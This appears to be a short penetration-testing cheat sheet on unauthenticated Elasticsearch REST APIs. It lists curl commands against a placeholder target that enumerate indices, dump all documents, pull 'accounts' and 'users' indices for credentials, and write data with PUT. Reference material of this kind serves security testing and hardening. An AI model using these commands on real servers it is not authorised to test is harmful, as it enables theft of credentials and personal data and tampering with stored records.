# ElasticSearch Unauthenticated REST API

ElasticSearch (default port 9200) exposes a REST API with no authentication by default. Allows full read/write access to all indices and data.

## Enumeration

```bash
# Check version and cluster info
curl http://<TARGET>:9200/

# List all indices
curl http://<TARGET>:9200/_cat/indices?v

# Dump all documents from an index
curl http://<TARGET>:9200/<index_name>/_search?pretty

# Get all data with large result set
curl "http://<TARGET>:9200/<index_name>/_search?pretty&size=1000"

# Search for specific field
curl "http://<TARGET>:9200/<index>/_search?q=<field>:<value>&pretty"
```

## Extract Credentials

```bash
# Dump index likely to contain accounts
curl http://<TARGET>:9200/accounts/_search?pretty
curl http://<TARGET>:9200/users/_search?pretty

# Get specific document by ID
curl http://<TARGET>:9200/<index>/_doc/<id>
```

## Notes
- Default port: 9200 (HTTP REST API), 9300 (cluster transport)
- No auth required unless X-Pack security is enabled (ElasticSearch 6.8+ / 7.1+)
- Often contains sensitive logs, credentials, PII
- Can write data: `curl -X PUT http://<TARGET>:9200/<index>/_doc/1 -H 'Content-Type: application/json' -d '{"field":"value"}'`
